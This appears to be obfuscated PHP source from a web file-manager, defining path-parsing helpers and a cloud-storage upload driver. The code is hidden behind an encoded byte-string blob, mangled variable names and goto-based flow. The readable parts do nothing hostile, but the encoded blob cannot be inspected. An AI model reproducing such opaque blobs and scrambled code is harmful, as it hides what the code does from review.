‘X')."\324\113\235\100\124\263\231\367\332\234\303\11\265\63\346\13\5\305\105\227\210\10\42\76\242\1\343\302\3\243\102\135\201\274\46\170\51\201\5\121\57\76\104\20\120\314\354\54\156\155\260\207\11\320\0\241"."\x4e\x88\xb5\xb8\xe1\x86\x5f\x58\x68\x7b\x1d\xee\x99\xc8\x36\xaa\xbc\xf\x71\x18\x10\x32\x99\x5a\x8\xf\x7c\xa\xed\x6b\xa8\xe3\xd\xae\x28\x3e\x91\x20\x3d\x0\xfb\x38\xee\xf8\x20\xb3\x12\xce\x9\xdb\x51\xae\x3\x83\xa4\x9".strrev('ûÀ#ø¨½`)Êß ËøÖ? PPÏN œƒE:'."\0".'phY·Éã ã\'Â“_xE*JDT£E…®')."\103\310\17\231\15\76\330\277\274\77\64\124\11\65\332\67\300\145\11\41\251\313\333\37\215\13\173\122\274\131\1\133\56\266\133\241\132\354\111\43\331\324\230\140\323\214\371\347\242\262\74\231\51\164\315\347"."\66\377\223\56\246\324\117\367\73\76\356\252\203\144\103\7\257\244\12\310\161\11\311\40\236\342\210\311\262\124\361\14\207\155\250\14\245\140\246\125\303\161\74\231\320\12\12\365\122\232\247\337\316\63\63\66"."\350\275\210\172\174\101\46\147\124\62\20\357\256\213\354\2\220\330\171\31\40\325\110\101\243\44\341\314\256\140\205\325\214\30\15\352\114\147\17\255\346\25\212\200\17\325\10\266\45\160\223\342\115\132\45\361"."\101\34\341\105\161\20\23\136\167\27\354\353\134\15\22\153\121\34\227\214\43\363\205\4\254\51\136\301\106\317\141\274\217\214\136\361\344\205\116\163\13\221\122\202\71\146\161\30\325\121\127\240\222\150\316\106".base64_decode('nX3CAtAbLrAFppgGioUPCvOWiVnQN8uy4DRodcZZmZhiQoWsQSp2VUqp8CmUJPRoku7jyFJEOnE=').base64_decode('Ne8ri/Z3o6uJPqckumjDNmukc12NkkBekPcIFIFPI1g3civMHMfRodMBlQ8+t/LDb8CwoUWPxbA=')."\x98\x21\x58\x80\xa9\x29\x3a\x74\xe8\xb1\x95\x8a\x6b\x9\x6\xa2\xd7\x58\x2a\xda\x48\xe1\xce\x82\xc9\x3e\x9b\xcb\x47\x7\x2\x98\xf2\xf6\x74\xf2\x2e\xbc\x50\x19\x7b\x6\x3\xbb\xc0\x13\x5f\xbd\x47\x59\x78\x9d\xb9\xa7\x4c\x0"."\322\361\113\363\102\47\160\107\152\370\45\31\352\0\324\233\112\71\301\121\235\1\313\235\261\271\231\353\122\342\72\35\154\100\43\201\120\177\115\55\224\250\154\266\373\175\123\314\271\65\30\65\264\146\367\51"."\x93\x7c\x50\x58\x84\xa6\x32\x9a\x34\x6d\x11\xec\x5a\xd0\x96\x9b\x81\x18\xd6\x84\x9a\x60\x2c\x9a\x30\xcd\xde\x1\xf\x3\x75\xd2\x6e\x62\x6f\x99\x10\x6b\x66\xe8\x49\x5e\x2c\x34\x44\xe4\xd3\x9\x6c\x2\x45\xf8\x66\x2b\xf3\xb6"."\x48\xb7\x3f\x13\x79\x2d\x29\x5\x43\x3d\x70\xef\xed\xb\x44\x96\x4b\x19\xd5\x92\xb8\xd0\x83\x2e\x29\xec\xb3\x1c\x39\x5e\x40\x87\x7a\x94\xc8\x13\x54\x85\x5\x5\x5d\xe8\x0\xc4\x65\xf3\x77\xc3\x76\x24\xa2\x1b\x46\x58\x50\x59"."\301\170\324\305\342\340\351\211\53\305\254\133\35\270\124\110\50\313\41\176\137\310\3\167\64\166\276\200\300\144\257\143\57\147\112\205\367\0\225\277\135\252\360\135\202\237\343\147\47\102\6\255\60\256\231\32".base64_decode('n/K0q6ZE/LK+RE0REKD3K27yzbqVfafMFJnHMQ55kUowesVDIj4BJ6wG0OEAWGq5rluR+j8h1+s=')."\224\66\110\124\270\251\266\275\25\107\222\301\116\120\321\50\251\343\260\220\43\34\350\351\215\316\126\134\31\266\226\342\17\301\71\52\243\245\250\264\310\374\76\3\31\21\225\207\265\166\154\165\202\212\11\234"."\167\4\174\62\172\110\213\73\25\105\101\40\117\312\360\170\13\125\100\346\127\364\161\164\111\114\246\225\246\43\313\123\142\276\211\141\201\120\34\77\34\206\243\36\247\210\234\106\266\241\310\272\110\360\256\343"."\xa1\x47\x8e\xcc\x63\x34\x3c\x79\xf6\x4f\x92\xaa\xbb\x2d\x1a\x82\x60\x6e\x6c\xa\x33\xd2\x57\xa5\x68\x65\x71\xd4\xe9\x23\x35\x6b\x93\x91\xcb\x71\x41\x9a\xc4\x6d\xe2\x19\x82\xd4\x26\xd5\x23\xd7\xa\x58\x9f\x6\xdd\xef\x2c\xa5"."\336\341\141\343\261\235\62\172\131\313\237\57\132\66\33\346\136\315\344\257\74\40\61\201\157\207\240\354\245\347\247\312\0\66\43\371\40\255\6\163\343\11\315\110\12\151\135\154\31\142\131\176\300\32\144\24"."\xc2\xb6\xd1\x32\x3c\xa9\xb6\x6\x10\x11\x4\xd5\x71\xd5\x9e\x7d\xd6\xb2\x4c\x27\xaf\x67\x7c\xda\xc6\x18\x51\x44\xa0\x23\x64\x94\x2a\x78\x49\xa7\xbf\xd0\xfd\xc\x93\x2f\x61\x55\x4\x41\x64\x1e\xfe\x89\x91\x5f\xca\x3\x9d\x45".base64_decode('g7HpIlohlABhtCyxT+VqaKSuMmfr+DYagAAbQJY4AkXTNGH4sTp6GDsNdGOPFVTuyGjMM6gNjZA=')._kodDe('L8cquxFK2Zt0x145vv+Yra9c0TI/nv92NMeh+5LY5r88xrCf9Qj6ECERtJaY4w308i9fu57Ipd1C').base64_decode('2Qc6NWTiA3cCOqojKdYtyr8EQVoq0fliWjY6giIHkEZkFEDEKQpJlaE24kQobMDQg39s7GCPkh8=')."\x9f\x9a\x66\xe2\x23\x8c\xf3\x7d\x86\xf8\x1a\x6\x6d\x2\x26\x8c\xb2\x6f\xa0\x5f\xb8\x89\x96\x71\x1b\x65\x46\x2e\x9a\x19\x44\xea\x85\x66\x4\xb\x58\x32\x77\xcb\x2e\xe3\xb3\x79\x64\xc4\xc2\x99\x3\xef\xe\x4a\xf6\x19\x95\x7f"."\20\326\60\52\176\334\46\311\71\205\70\326\113\216\14\141\147\117\106\365\162\207\10\334\225\121\241\224\347\76\243\100\304\56\300\142\321\236\272\222\370\232\346\226\214\234\214\124\143\145\372\106\234\214\237\43".base64_decode('lW1FoArFLaHBTJpyDFfZx/6N0onLWCTQAtEAe5jASa3oYqMymmajS7B75EfG+EnJopNRrs6nGps=').base64_decode('WhaL+0U+jNxxDTnKJ1o+9GiMEYZkpzOJvmMpzmyUaPd8S541Fbigg3/9W9PBW0ncxJmEEyxWstA=')."\x5\x95\xbe\xf2\xff\xaf\x87\xdd\x83\x19\xd9\x7\xfa\x98\x8c\x29\x8\x86\xa2\x8\xcb\x6b\x8f\xdf\x5c\xfc\xf7\xbf\x4f\x5\x36\xc5\xee\xc3\xa\xa5\xda\xa7\xbe\x70\xec\xa0\x5a\x21\x68\xe8\x4e\x5f\x24\xe6\xd2\x3e\x7f\x57\x49\x58".base64_decode('32BZXlGELRfB6czhOk7I0Tt3k4GIxEYwwgOlot90VFAUNXK2otEekNSXUAy6LEdO37w9zBU+vEg=').strrev('ySl‡Èà¨jâ^D…ˆ&·Ğó( Sî#«sˆ%"m"lÔôBXÈv“‚X§,&Î1€Uä')."\x4f\x79\xc9\x84\x49\xc9\xe2\xb3\xac\x20\xca\x8\x85\x70\x74\x32\xf3\x90\x57\x5c\xfc\x59\x81\x7f\x73\x56\xcd\x43\xfd\x54\x31\x1f\x46\x84\x3\x19\x24\xc6\xb1\xc4\xac\x28\xe1\xc1\x57\x81\xec\x42\xd\xab\x5\xe2\x32\x95\x68\x16"."\x57\x2\x12\x22\x59\x44\x50\x90\x72\x36\xa8\xb9\x8b\xc\x66\x61\x1e\xd2\x7b\xf6\x99\x8a\x1a\xf4\x35\x2b\x11\x2c\x8e\x79\x65\x26\x11\xd1\x47\xbc\xb0\xd2\x89\xcc\x74\x8e\x98\x4a\x28\x4b\xb6\xc5\x48\x84\x8b\x58\x48\xf\x5a\xb8".base64_decode('00Fx5myTPvFEX35SmNcW6I6G7WvwmQ9ByeU44xaf7MglFMMNKGzUoi68KkXEVlYQx6lIwBtQ0JI=')."\xa3\x15\x5c\xf6\xc0\xfe\x87\x3a\x32\x2\xcf\x14\x56\x9a\x32\x34\xce\x53\xc0\x82\xc4\x74\xdb\x68\x8\xc9\xae\x50\x46\x21\xef\x60\xdb\xde\x49\x8\xb1\x3b\xdf\x5a\xe2\xee\x6d\x64\x19\x65\x8\x70\x16\xd2\xc3\x24\x91\x17\xd8\x40"."\x65\x1c\x24\x6a\x63\xde\x36\x60\x5\x22\x80\x8e\xd0\x29\x3d\xd8\x72\x40\xe7\x40\x9d\x82\x10\x8c\x16\xa7\x62\xc9\xf9\xaa\x34\x96\x51\xc5\x1e\x17\x9d\x38\x89\x5\x44\x88\x17\xa7\x32\x36\xc7\x66\xaa\x88\xc7\x97\x2\x1c\x87\xf".strrev('ën–häâ\'ÃA"+Ôm”;ê:Gaãg!'."\0".'=¸Iñ3IÓŠ­M(íÈá…WÜ-íğ×âœ÷ÛZ')."\x5\x20\x53\xb\xa7\xe8\xf8\xe5\x44\xfc\x74\x35\x7c\xf6\xd\xf0\x35\x29\x32\xd8\x57\x83\xfc\x5c\x43\x0\xf2\xa6\x83\x5e\xdf\x5a\x47\x64\x86\x75\xd2\x5c\x49\xf8\xf\xbf\xc1\x56\x3\x93\x61\x21\xeb\xa4\x40\x3f\x7f\x5\xb7\x56"."\xe2\x6f\x87\x89\xef\x63\xc3\x63\xa6\x6e\x9d\x51\x87\xdd\x4d\x3f\xf4\xa1\x6b\x9f\xa\xed\x95\xd0\x92\xba\x61\xa\x68\xc2\x13\x44\x2b\xa0\xc3\x71\x1c\xec\xd3\xa\xf4\x75\x8\x42\xe1\x34\x3b\xe9\x7a\xf1\x89\x7b\x7b\xf9\x60\xa4".base64_decode('I5ZtTPj74M53wdEuDG+sbPsrokkjgoSTIKgubnehihIRmD6vSEoQjrPtFwvsYegy9lXSgkIyykU=')."\137\365\2\277\320\203\177\200\373\123\100\311\370\0\316\73\256\60\55\23\147\256\101\233\220\52\134\103\44\21\5\362\235\4\312\230\0\265\104\377\170\213\232\63\207\225\325\214\124\247\126\110\71\361\113\205"."\x4\x83\x72\x74\x30\x18\x9d\x95\xc0\x40\x8c\xe2\x1c\xdc\x1\x17\x16\x1b\xce\x43\x95\x71\x7e\x4c\xcd\xc5\xc6\x54\xaa\x5b\x19\xaf\x80\xca\xac\x9f\x19\x14\x40\x18\x2a\x92\x89\x84\x87\x46\xb8\xef\x5d\x75\x42\xfc\x3a\xc1\x4b\x97"."\x2f\x35\x10\xb1\x1c\xca\x1f\x22\x71\xb6\xb\xcd\x1b\x6\x27\x37\x3\x5\xc1\x31\x1a\x21\x37\xe\xc2\xf\xc7\x33\xcf\x77\xb8\x28\x43\x47\x19\x95\x14\x77\x89\x87\xeb\xc8\x76\x78\xfc\x93\xf6\xf7\x52\x18\x1a\x93\xd7\x0\xe\xd2"."\43\167\331\240\16\367\277\360\260\213\56\272\216\44\262\275\24\212\257\270\13\265\221\102\120\50\116\274\234\230\65\103\244\362\107\70\275\332\273\70\342\270\22\161\260\120\216\114\327\73\335\66\40\2\203\145".strrev('îÊäÈ5yÌ»@?;OåO$gÖQ‡8µ³ƒ1"ÑÕ|a\'µæœ(#£ÌU§'."\0".'½£pçEVÑ1a˜%')."\55\243\172\205\74\270\106\25\263\341\44\230\223\13\164\266\274\342\266\227\147\3\320\222\71\113\15\313\333\217\146\207\243\365\244\316\334\365\266\200\72\133\227\124\104\56\377\34\31\177\47\66\332\312\126\256"."\x45\xc5\x6d\xf7\x6c\xb5\xa8\x88\x3c\x6b\x2d\x38\xb6\xe3\x96\xb1\x12\x9b\xa3\x29\x15\x18\x1b\xbf\x14\x2c\x67\xa1\x3c\xad\xc2\x15\x25\x2e\x13\xae\xaf\x61\x9b\xc6\x5e\x59\xb2\x78\xdf\x59\xf9\x46\x34\x5c\x71\x22\x9a\xf6\xab\x4a"."\x7\x5c\xec\x18\xaa\x7b\xb1\xfd\xd4\x53\x76\x3e\x74\x6e\x60\x40\xa2\x1\x11\x6c\x63\xbc\xa5\xc2\x68\x81\x3a\x35\x2\x5f\xe0\xce\x2\xa1\xe1\xa2\xd7\x70\xf6\x1f\x15\xe3\x1c\x7e\x73\x29\x79\x16\x4a\x82\xaf\xd6\x8a\x8e\x77\x65"."\270\11\56\337\145\346\250\313\53\321\55\61\336\212\350\226\226\24\64\45\40\120\364\254\213\323\351\107\162\374\260\212\310\0\370\2\314\47\52\376\242\332\152\360\231\164\166\311\150\273\121\253\220\356\346\207".base64_decode('lza/zeg5LWbMjRdlcnyLLxuQUguBdE7BnZSM1zqcHNENCxp5A35cRL+dumVRNgEkW4SJRDfkQ0Y=')."\xb8\x42\x5\x21\xfe\x9e\x29\xec\x5b\x74\x72\x8c\x8\x15\x31\x14\x14\x24\xd7\x1e\x70\xd7\x19\x51\x71\x2a\x62\x52\xb6\x8\x3c\x91\x66\x91\x70\xf9\xd1\x73\x77\xc9\x71\xcf\xc2\x1\x60\xbf\x98\xd0\x27\x9\x11\xa0\x97\x50\x78\x7d"."\xe0\xd1\x31\xe9\x16\xa7\x78\xc6\x7d\xff\x13\x2a\x14\x2f\x84\x91\x16\x96\xe9\xc1\x29\x1e\xa2\xb1\xed\x42\x65\xb8\xc8\x73\x79\x4c\x63\x8b\x64\x4f\xa1\x89\xc5\xbc\x50\x7e\x5d\x9\xe4\xa4\x8d\x17\x81\xdf\x6c\x46\x67\x42\xf0\xa9"."\x73\xff\xaa\x40\x24\x1a\x29\x4b\x1a\xf0\x46\x22\x43\xa1\xb0\xf\x6b\x7d\x96\x25\xa3\x5c\xc2\xed\x7b\x59\xd2\x40\x6f\xa8\x7f\xb6\x34\x7f\x9f\x37\x10\x2c\x4b\x83\xb7\xf1\x50\x17\x95\xbe\xe8\x88\x93\x2\x3\xa8\x96\xde\x60\x90"."\xaa\x7e\x95\xd7\x22\xd0\xb5\x9c\xd7\x4\x5d\x42\xf1\x23\xd3\x62\x56\xa7\x27\x90\xe\xb5\x14\x7a\xc2\x1c\x51\xe8\x34\x81\xcc\x9f\xed\x79\x85\xb0\x9a\x67\xe7\x53\x42\x71\xf6\x83\x2\x71\xc8\x4d\xfa\xe2\x28\xb\x14\xcb\x76\x10".base64_decode('wkIPb8/7SWFh6mwRPn/Npj+TZlHjRDUcfuXmtl3NCXA0cRATEghSXIMRgKiNOq5GHJ0prPfll2s=')."\x8\xc2\x3b\x4\xd6\xfb\x58\xea\x6c\x61\xbd\x9e\x10\xe\x5d\x31\x9f\xb2\x71\x28\x51\xff\x1\x87\x1d\xc\x2c\x15\xd5\xa3\x4a\x86\xf0\x15\x28\x58\xf0\x58\xe7\x94\x18\x16\x4f\x34\xda\x19\x5b\xb1\x94\xc\xbd\xe1\x76\xb2\x62\xe1"."\x4a\x17\xf6\xd2\xff\x1\xc3\xc3\xef\x73\x6\xc2\x0\x0"."", 10, -8))); goto d¸ñ©ğÏ¦; Cğ•Ä®Æ ’: class KodIO { const KOD_SOURCE = "\173\x73\157\165\x72\x63\145\175"; const KOD_USER_RECYCLE = "\173\x75\x73\x65\162\x52\x65\143\171\x63\154\145\x7d"; const KOD_USER_FAV = "\x7b\x75\163\x65\x72\106\141\x76\175"; const KOD_USER_FILE_TAG = "\173\165\163\x65\162\106\x69\154\x65\124\x61\147\175"; const KOD_USER_FILE_TYPE = "\173\x75\163\145\x72\x46\x69\154\x65\124\x79\x70\145\175"; const KOD_GROUP_ROOT_SELF = "\173\x67\162\x6f\x75\160\122\157\x6f\164\x53\145\154\146\x7d"; const KOD_USER_SHARE = "\x7b\x75\x73\145\162\123\150\141\162\145\x7d"; const KOD_USER_SHARE_LINK = "\x7b\165\163\x65\162\x53\150\141\162\145\114\x69\156\153\x7d"; const KOD_USER_SHARE_TO_ME = "\x7b\163\x68\141\x72\x65\x54\x6f\x4d\x65\x7d"; const KOD_SHARE_ITEM = "\173\163\150\x61\162\145\111\x74\145\155\x7d"; const KOD_SHARE_LINK = "\x7b\x73\x68\x61\162\x65\x49\164\x65\x6d\114\151\156\153\x7d"; const KOD_SEARCH = "\x7b\x73\145\x61\x72\143\150\x7d"; const KOD_BLOCK = "\173\x62\154\x6f\x63\153\175"; const KOD_IO = "\173\x69\157\x7d"; const KOD_USER_RECENT = "\173\x75\x73\x65\x72\x52\x65\156\143\145\x6e\164\175"; const KOD_USER_DRIVER = "\x7b\x64\x72\151\166\145\x72\175"; public static function typeList() { $Bæ½†„Å‘² =& $_SERVER[£ü]; return array($Bæ½†„Å‘²[1040] => self::KOD_SOURCE, $Bæ½†„Å‘²[1041] => self::KOD_USER_RECYCLE, $Bæ½†„Å‘²[1042] => self::KOD_USER_FAV, $Bæ½†„Å‘²[1043] => self::KOD_USER_FILE_TAG, $Bæ½†„Å‘²[1044] => self::KOD_USER_FILE_TYPE, $Bæ½†„Å‘²[1045] => self::KOD_GROUP_ROOT_SELF, $Bæ½†„Å‘²[1046] => self::KOD_USER_SHARE, $Bæ½†„Å‘²[1047] => self::KOD_USER_SHARE_LINK, $Bæ½†„Å‘²[1048] => self::KOD_USER_SHARE_TO_ME, $Bæ½†„Å‘²[1049] => self::KOD_SHARE_ITEM, $Bæ½†„Å‘²[1050] => self::KOD_SHARE_LINK, $Bæ½†„Å‘²[1051] => self::KOD_SEARCH, $Bæ½†„Å‘²[1052] => self::KOD_BLOCK, $Bæ½†„Å‘²[1053] => self::KOD_IO, $Bæ½†„Å‘²[1054] => self::KOD_USER_RECENT, $Bæ½†„Å‘²[1055] => self::KOD_USER_DRIVER); } public static function parse($fÓó¥ÎÜ˜¹) { goto c¥óô§Û‰; DÛëâÁ£Æ: $e²Ù®íŞ·ø = array($B‚¿­‹ÏæÚ[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $AÔù·ê’Ê[$B‚¿­‹ÏæÚ[1060]] = in_array($AÔù·ê’Ê[$B‚¿­‹ÏæÚ[29]], $e²Ù®íŞ·ø); return $AÔù·ê’Ê; goto aŒ†“†ÕÍó; c¥óô§Û‰: $B‚¿­‹ÏæÚ =& $_SERVER[£ü]; $fÓó¥ÎÜ˜¹ = self::clear($fÓó¥ÎÜ˜¹); $dİ©á¢÷øç = array_values(self::typeList()); goto d‰â÷¹–Ôå; d‰â÷¹–Ôå: preg_match($B‚¿­‹ÏæÚ[1056], $fÓó¥ÎÜ˜¹, $BÕÊ•¤ŒÓÄ); $AÔù·ê’Ê = array($B‚¿­‹ÏæÚ[385] => !1, $B‚¿­‹ÏæÚ[1057] => !1, $B‚¿­‹ÏæÚ[382] => !1, $B‚¿­‹ÏæÚ[75] => $fÓó¥ÎÜ˜¹, $B‚¿­‹ÏæÚ[1000] => !1, $B‚¿­‹ÏæÚ[999] => $B‚¿­‹ÏæÚ[33]); if (is_array($BÕÊ•¤ŒÓÄ) && count($BÕÊ•¤ŒÓÄ) == 5) { $dİ±ÁÃŞÏÌ = $B‚¿­‹ÏæÚ[1058] . $BÕÊ•¤ŒÓÄ[2] . $B‚¿­‹ÏæÚ[312]; if (in_array($dİ±ÁÃŞÏÌ, $dİ©á¢÷øç)) { $AÔù·ê’Ê[$B‚¿­‹ÏæÚ[1000]] = $BÕÊ•¤ŒÓÄ[1]; $AÔù·ê’Ê[$B‚¿­‹ÏæÚ[29]] = $dİ±ÁÃŞÏÌ; $AÔù·ê’Ê[$B‚¿­‹ÏæÚ[1059]] = substr($dİ±ÁÃŞÏÌ, 1, -1); $AÔù·ê’Ê[$B‚¿­‹ÏæÚ[364]] = $BÕÊ•¤ŒÓÄ[3]; } $AÔù·ê’Ê[$B‚¿­‹ÏæÚ[999]] = $BÕÊ•¤ŒÓÄ[4]; } goto DÛëâÁ£Æ; aŒ†“†ÕÍó: } public static function clear($EÕîç¶ŸÚ) { goto cÎ“¸ßùæ; F†ƒÁ×—„: if ($EÕîç¶ŸÚ == $FïÙùÅ½–¢[8]) { return $FïÙùÅ½–¢[8]; } $EÕîç¶ŸÚ = rtrim($EÕîç¶ŸÚ, $FïÙùÅ½–¢[8]); return $EÕîç¶ŸÚ; goto E¾öèÓ»îµ; B ÂƒÈö‡Õ: if (substr($EÕîç¶ŸÚ, 0, 3) == $FïÙùÅ½–¢[1062]) { $EÕîç¶ŸÚ = substr($EÕîç¶ŸÚ, 3); } while (strstr($EÕîç¶ŸÚ, $fÄÒ‰†ç)) { $EÕîç¶ŸÚ = str_replace($fÄÒ‰†ç, $FïÙùÅ½–¢[8], $EÕîç¶ŸÚ); } $EÕîç¶ŸÚ = preg_replace($FïÙùÅ½–¢[1063], $FïÙùÅ½–¢[8], $EÕîç¶ŸÚ); goto F†ƒÁ×—„; cÎ“¸ßùæ: $FïÙùÅ½–¢ =& $_SERVER[£ü]; $EÕîç¶ŸÚ = str_replace($FïÙùÅ½–¢[95], $FïÙùÅ½–¢[8], $EÕîç¶ŸÚ); $fÄÒ‰†ç = $FïÙùÅ½–¢[1061]; goto B ÂƒÈö‡Õ; E¾öèÓ»îµ: } public static function sourceID($cÆ¦ÉÍ©ª‰) { $f“§×÷Ô¥† =& $_SERVER[£ü]; $CÓºŸ®ïë = self::parse($cÆ¦ÉÍ©ª‰); if ($CÓºŸ®ïë[$f“§×÷Ô¥†[29]] !== self::KOD_SOURCE) { show_json(LNG($f“§×÷Ô¥†[1064]), !1); } return $CÓºŸ®ïë[$f“§×÷Ô¥†[364]]; } public static function make($dİò¦Ø•“¢) { if (!$dİò¦Ø•“¢) { return !1; } return self::makePath(self::KOD_SOURCE, intval($dİò¦Ø•“¢)); } public static function makeShare($E™¤…«Ğ, $d™Ø›·º¯ˆ) { return self::makePath(self::KOD_SHARE_ITEM, $E™¤…«Ğ, $d™Ø›·º¯ˆ); } public static function makeFileTypePath($EÑ¨Ğê‡”) { return self::makePath(self::KOD_USER_FILE_TYPE, $EÑ¨Ğê‡”); } public static function makeFileTagPath($e„ù™¦ë×¤) { return self::makePath(self::KOD_USER_FILE_TAG, $e„ù™¦ë×¤); } public static function makePath($eŒğ«½îæ÷, $dÕÆˆË¼Ö = '', $eŠ¿ãøï¬ = '') { $eŞ“æİ‡É” =& $_SERVER[£ü]; $Fé¸ƒİ‘ù = substr($eŒğ«½îæ÷, 1, -1); $DÓ‚¯„»¢› = $eŞ“æİ‡É”[1065] . $Fé¸ƒİ‘ù . $eŞ“æİ‡É”[1066] . $dÕÆˆË¼Ö . $eŞ“æİ‡É”[1067]; $DÓ‚¯„»¢› = $eŠ¿ãøï¬ ? $DÓ‚¯„»¢› . $eŠ¿ãøï¬ . $eŞ“æİ‡É”[8] : $DÓ‚¯„»¢›; return $DÓ‚¯„»¢›; } public static function hashPath($C§†°…Íò) { $bÂ©²‡¾é· =& $_SERVER[£ü]; $fÏ‰â‹èÛå = is_array($C§†°…Íò) ? $C§†°…Íò : IO::info($C§†°…Íò); $e¿½ŞƒØ² = _get($fÏ‰â‹èÛå, $bÂ©²‡¾é·[1068], $bÂ©²‡¾é·[33]); if (!$e¿½ŞƒØ²) { $fÈõÕøù™³ = KodIO::parse($fÏ‰â‹èÛå[$bÂ©²‡¾é·[75]]); if (!$fÈõÕøù™³[$bÂ©²‡¾é·[29]]) { $e¿½ŞƒØ² = IO::hashSimple($fÏ‰â‹èÛå[$bÂ©²‡¾é·[75]]); } } if (!$e¿½ŞƒØ²) { $e¿½ŞƒØ² = md5($fÏ‰â‹èÛå[$bÂ©²‡¾é·[75]] . $fÏ‰â‹èÛå[$bÂ©²‡¾é·[77]] . $fÏ‰â‹èÛå[$bÂ©²‡¾é·[107]]); } return $e¿½ŞƒØ²; } public static function initSystemPath() { $b‡¹‚´¸À‚ =& $_SERVER[£ü]; if (defined($b‡¹‚´¸À‚[1069])) { return; } define($b‡¹‚´¸À‚[1069], self::systemPath($b‡¹‚´¸À‚[1070])); define($b‡¹‚´¸À‚[1071], self::systemPath($b‡¹‚´¸À‚[1072])); define($b‡¹‚´¸À‚[1073], self::systemPath($b‡¹‚´¸À‚[1074])); define($b‡¹‚´¸À‚[1075], self::systemPath($b‡¹‚´¸À‚[1076])); } private static function systemPath($f³óõÂñ) { goto fŞÊĞ‘…ÏÌ; fŞÊĞ‘…ÏÌ: $d—‹Àæò± =& $_SERVER[£ü]; $dÏ Ê›¾„¬ = $d—‹Àæò±[1077] . ucfirst($f³óõÂñ); $e¬™‚Åà« = Model($d—‹Àæò±[1078])->get($dÏ Ê›¾„¬); goto dßŒ¸í§”¾; a“Ù…ˆ‰¸: return $e¬™‚Åà«; goto aïÓ•éİĞ‡; dßŒ¸í§”¾: if ($e¬™‚Åà«) { return $e¬™‚Åà«; } if ($f³óõÂñ == $d—‹Àæò±[1070]) { $e¬™‚Åà« = self::make(Model($d—‹Àæò±[748])->systemRootPathAdd($d—‹Àæò±[1079])); } else { $e¬™‚Åà« = self::systemPath($d—‹Àæò±[1070]); $cŞîï«¶¨’ = self::sourceID($e¬™‚Åà«); $e¬™‚Åà« = self::make(Model($d—‹Àæò±[748])->mkdir($cŞîï«¶¨’, $f³óõÂñ)); } Model($d—‹Àæò±[1078])->set($dÏ Ê›¾„¬, $e¬™‚Åà«); goto a“Ù…ˆ‰¸; aïÓ•éİĞ‡: } public static function systemFolder($A´‡Æ³š¤³) { $E™µà†Ö»Û = IO_PATH_SYSTEM_SOURCE . $A´‡Æ³š¤³; $D¸ÔÈÕëéÜ = Cache::get($E™µà†Ö»Û); if (!$D¸ÔÈÕëéÜ) { $e¡Ø¦òõÆ = IO::infoFull($E™µà†Ö»Û); if (!$e¡Ø¦òõÆ) { $D¸ÔÈÕëéÜ = IO::mkdir($E™µà†Ö»Û, REPEAT_SKIP); } else { $D¸ÔÈÕëéÜ = $e¡Ø¦òõÆ[$_SERVER[£ü][75]]; } Cache::set($E™µà†Ö»Û, $D¸ÔÈÕëéÜ, 3600 * 10); } return $D¸ÔÈÕëéÜ; } public static function defaultDriver() { return Model($_SERVER[£ü][693])->defaultDriver(); } public static function defaultIO() { $C¨‘Âîá©” =& $_SERVER[£ü]; $e é§¤÷ùÕ = self::defaultDriver(); return $C¨‘Âîá©”[1080] . $e é§¤÷ùÕ[$C¨‘Âîá©”[364]] . $C¨‘Âîá©”[1067]; } public static function fileTypeList() { $cäƒ˜ğñöÅ =& $_SERVER[£ü]; $d§Æá¼ŞÊª = $GLOBALS[$cäƒ˜ğñöÅ[6]][$cäƒ˜ğñöÅ[1081]]; foreach ($d§Æá¼ŞÊª as $Eø†‰ÈÜ­ => $b¤•ÏªÎÈë) { $b’®õ¼ø” = $cäƒ˜ğñöÅ[1082] . $Eø†‰ÈÜ­; $eÚŠ”ˆ˜– = LNG($b’®õ¼ø”); if ($b’®õ¼ø” != $eÚŠ”ˆ˜–) { $d§Æá¼ŞÊª[$Eø†‰ÈÜ­][$cäƒ˜ğñöÅ[28]] = $eÚŠ”ˆ˜–; } } return $d§Æá¼ŞÊª; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($Cñß¬ëÀ) { parent::__construct($Cñß¬ëÀ); $this->signatureVersion($_SERVER[£ü][197]); } public function uploadFormData($f¸Œ°²‚¸¤, $B‰—Ñ–òÂÓ = 3600) { goto Fğ¨Ù÷–à; cÆˆÃµ¤¾: return $aŸÜá‹µô‹; goto A‚ÅŞ÷÷¢‹; Fğ¨Ù÷–à: $E•ÑùÈ¦† =& $_SERVER[£ü]; $e›âğå““¨ = $E•ÑùÈ¦†[182]; $F‡î×©ƒšå = $E•ÑùÈ¦†[215]; goto a„³®áä£; AËì½²­ù¶: $F¤…Ş¬ëêÓ = array($E•ÑùÈ¦†[1085] => $F¼Î„åšÊ¦, $E•ÑùÈ¦†[1086] => array(array($E•ÑùÈ¦†[1087] => $e›âğå““¨), array($E•ÑùÈ¦†[1088] => $this->bucket), array($E•ÑùÈ¦†[1089], $E•ÑùÈ¦†[1090], $E•ÑùÈ¦†[33]), array($E•ÑùÈ¦†[1091] => $a¤öÅ ¹ß), array($E•ÑùÈ¦†[1092] => $F‡î×©ƒšå), array($E•ÑùÈ¦†[1093] => $this->accessKey), array($E•ÑùÈ¦†[1094] => $cö‡¦œâ))); $F¤…Ş¬ëêÓ = json_encode($F¤…Ş¬ëêÓ); $C‹…™Æ¬â = hash_hmac($E•ÑùÈ¦†[215], $cö‡¦œâ, $this->secret); goto d›Ğ˜±—; d›Ğ˜±—: $b´Ó¬ä‡Ã = sha1($F¤…Ş¬ëêÓ); $dŠÓ–·Ş— = hash_hmac($E•ÑùÈ¦†[215], $b´Ó¬ä‡Ã, $C‹…™Æ¬â); $aŸÜá‹µô‹ = array($E•ÑùÈ¦†[1087] => $e›âğå““¨, $E•ÑùÈ¦†[1091] => $a¤öÅ ¹ß, $E•ÑùÈ¦†[1095] => base64_encode($F¤…Ş¬ëêÓ), $E•ÑùÈ¦†[1092] => $F‡î×©ƒšå, $E•ÑùÈ¦†[1093] => $this->accessKey, $E•ÑùÈ¦†[1096] => $cö‡¦œâ, $E•ÑùÈ¦†[1097] => $dŠÓ–·Ş—, $E•ÑùÈ¦†[166] => $this->getHost()); goto cÆˆÃµ¤¾; a„³®áä£: $a¤öÅ ¹ß = $E•ÑùÈ¦†[1083]; $F¼Î„åšÊ¦ = gmdate($E•ÑùÈ¦†[1084], time() + $B‰—Ñ–òÂÓ); $cö‡¦œâ = (string) time() . $E•ÑùÈ¦†[67] . (string) (time() + $B‰—Ñ–òÂÓ); goto AËì½²­ù¶; A‚ÅŞ÷÷¢‹: } public function fileOutLink($Cšì¾šÃØ) { $f¯¤ÊÅìÓø =& 